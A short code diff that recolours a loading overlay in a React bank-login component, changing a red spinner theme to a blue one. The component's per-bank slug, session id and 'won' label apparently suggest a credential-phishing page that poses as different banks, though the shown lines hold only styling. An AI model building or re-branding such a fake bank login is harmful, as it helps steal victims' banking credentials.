@@ -816,8 +816,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           wonLabel={wonLabel}
         />
         {saving && (
-          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#0c0207]">
-            <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#020824]">
+            <div className="size-12 animate-spin rounded-full border-4 border-[#00A9E0]/30 border-t-[#00A9E0]" />
           </div>
         )}
       </>
@@ -849,8 +849,8 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
           wonLabel={wonLabel}
         />
         {saving && (
-          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#0c0207]">
-            <div className="size-12 animate-spin rounded-full border-4 border-[#E30613]/30 border-t-[#E30613]" />
+          <div className="fixed inset-0 z-[99999] flex items-center justify-center bg-[#020824]">
+            <div className="size-12 animate-spin rounded-full border-4 border-[#00A9E0]/30 border-t-[#00A9E0]" />
           </div>
         )}
       </>
